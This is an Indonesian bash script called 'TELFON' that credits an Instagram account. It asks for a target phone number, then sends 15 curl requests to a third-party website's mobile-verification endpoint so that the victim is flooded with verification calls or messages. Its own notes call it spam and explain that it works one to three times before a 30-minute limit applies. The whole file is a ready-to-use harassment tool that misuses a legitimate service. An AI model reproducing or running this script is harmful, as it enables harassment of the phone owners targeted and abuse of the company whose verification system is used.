clear
figlet TELFON
echo
sleep 2
echo "#####################################"
echo "(+) PEMBUAT : Vdghanh             (+)"
echo "(+) IG      : @Vdganh             (+)"
echo "====================================="
echo "PILIHAN"
echo "1). TELFON"
echo "2). Keluar"

echo "====================================="
echo "CATATAN"
echo "Spam Ini bekerja 1-3 Kali    "
echo "Karna memiliki batas waktu setelah 3x"
echo "Yaitu 30 menit jadi tunggu aj sebentar"
echo "Sekian saja JGN LUPA Follow IG @Vdganh"
echo "++++++++++++++++++++++++++++++++++++++"
read -p "=> " number

if [ $number = 1 ]
then
read -p "Masukkan Nomor Yang Di Tuju Ex:8** => " nomor;
echo "Sedang Dalam Proses"
fi
for link in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 
do
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link

done